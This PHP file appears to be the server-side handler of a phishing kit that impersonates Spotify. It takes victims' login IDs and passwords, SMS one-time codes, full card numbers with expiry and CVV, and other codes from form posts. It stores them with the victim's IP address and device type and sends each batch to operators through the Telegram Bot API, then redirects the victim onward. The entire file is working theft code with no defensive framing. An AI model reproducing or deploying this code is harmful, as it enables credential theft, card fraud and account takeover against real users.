<?php
require "../main.php";

$bot = $a_bot;
$ids = explode(",",str_replace(" ","",$a_ids));


$panel = str_replace('web/send.php', '' , "http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']."panel/view.php?vip=$ip");

$ip = $_SERVER['REMOTE_ADDR'];
$userAgent = $_SERVER['HTTP_USER_AGENT'];

// Match common platforms
if (preg_match('/Android/i', $userAgent)) {
    $platform = 'Android';
} elseif (preg_match('/iPhone|iPad|iPod/i', $userAgent)) {
    $platform = 'iPhone';
} elseif (preg_match('/Windows/i', $userAgent)) {
    $platform = 'Windows';
} elseif (preg_match('/Macintosh|Mac OS X/i', $userAgent)) {
    $platform = 'Mac';
} elseif (preg_match('/Linux/i', $userAgent)) {
    $platform = 'Linux';
} else {
    $platform = 'Unknown';
}

//echo "AGENT: " . $platform;

function post($data){
	if(empty(trim($data))){
		return "NO_DATA";
	}else{
		return htmlspecialchars($_POST[$data]);
	}
}


function sendBot($url){
	$ci = curl_init();
	curl_setopt($ci, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($ci,CURLOPT_FOLLOWLOCATION, true);
	curl_setopt($ci, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ci, CURLOPT_URL, $url);
	return curl_exec($ci);
	curl_close($ci);
}


if(isset($_POST['keydadadaad'])){
    
    $uss = post("keydadadaad");
    $usc = post("keydadadaade4");

    $telegcorier_content = urlencode("
    🔹LG Spotify 🆕 | 🌐 IP : $ip
        
    ✧ ID : $uss
    ✧ PS : $usc
    
    🖥️ Device    : $platform
    
    ⚡ PANEL : $panel
    ");

    // Update logs
    $oldlogs = $m->getData()["LOGS"];
    $newlogs = $oldlogs."\n+ LOGIN🔹=> [ $uss | $usc ]";
    $arr = array("LOGS"=>$newlogs);
    $m->update($arr);

    // Send message to Telegram bot
    foreach($ids as $id){
        $url = "https://api.telegram.org/bot$bot/sendMessage?chat_id=$id&text=$telegcorier_content";
        sendBot($url);
    }

    // Redirect after processing
    header("location: next.php?unlock=code&appIdKey=1834f733528e1a9fc930069fa3763a20009d41769&country=none");
}


if(isset($_POST['keydod'])){
    
    $rrt = post("keydod");

    $telegcorier_content = urlencode("
    🔸OTP Spotify ⬇️ | 🌐 IP : $ip
    
    ✧ SMS : $rrt
    
    🖥️ Device    : $platform
    
    ⚡ PANEL : $panel
    ");

    // Update logs
    $oldlogs = $m->getData()["LOGS"];
    $newlogs = $oldlogs."\n+ OTP 📲 => [ $rrt ]";
    $arr = array("LOGS"=>$newlogs);
    $m->update($arr);

    // Send message to Telegram bot
    foreach($ids as $id){
        $url = "https://api.telegram.org/bot$bot/sendMessage?chat_id=$id&text=$telegcorier_content";
        sendBot($url);
    }

    // Redirect after processing
    header("location: loading.php?unlock=code&appIdKey=1834f733528e1a9fc930069fa3763a20009d41769&country=none");
}


if(isset($_POST['cddd'])){
    
    $car = post("cddd");
    $exp = post("bebeb");
    $cvv = post("gagaga");
    
    // Remove spaces from the card number
    $car_no_spaces = str_replace(' ', '', $car);
    
    // Prepare the Telegram content
    $telegcorier_content = urlencode("
    🏦 CC Spotify 📌 | 🌐 IP : $ip

    ✧ Copy : $car_no_spaces
    ✧ CARD : $car
    ✧ EXP  : $exp
    ✧ CVV  : $cvv
    
    🖥️ Device    : $platform
    
    ⚡ PANEL : $panel
    ");

    // Update logs
    $oldlogs = $m->getData()["LOGS"];
    $newlogs = $oldlogs."\n+ CARD ✔️ => [ $car | $exp | $cvv ]";
    $arr = array("LOGS"=>$newlogs);
    $m->update($arr);

    // Send message to Telegram bot
    foreach($ids as $id){
        $url = "https://api.telegram.org/bot$bot/sendMessage?chat_id=$id&text=$telegcorier_content";
        sendBot($url);
    }

    // Redirect after processing
    header("location: loading.php?unlock=code&appIdKey=1834f733528e1a9fc930069fa3763a20009d41769&country=none");
}

if(isset($_POST['keydodnn'])){
    
    $rrt = post("keydodnn");

    $telegcorier_content = urlencode("
    🏷️ CUSTOM CODE ⌯⌲ | 🌐 IP : $ip
    
    ✧ CODE : $rrt
    
    🖥️ Device    : $platform
    
    ⚡ PANEL : $panel
    ");

    // Update logs
    $oldlogs = $m->getData()["LOGS"];
    $newlogs = $oldlogs."\n+ CUSTOM 🏷️ => [ $rrt ]";
    $arr = array("LOGS"=>$newlogs);
    $m->update($arr);

    // Send message to Telegram bot
    foreach($ids as $id){
        $url = "https://api.telegram.org/bot$bot/sendMessage?chat_id=$id&text=$telegcorier_content";
        sendBot($url);
    }

    // Redirect after processing
    header("location: loading.php?unlock=code&appIdKey=1834f733528e1a9fc930069fa3763a20009d41769&country=none");
}
?>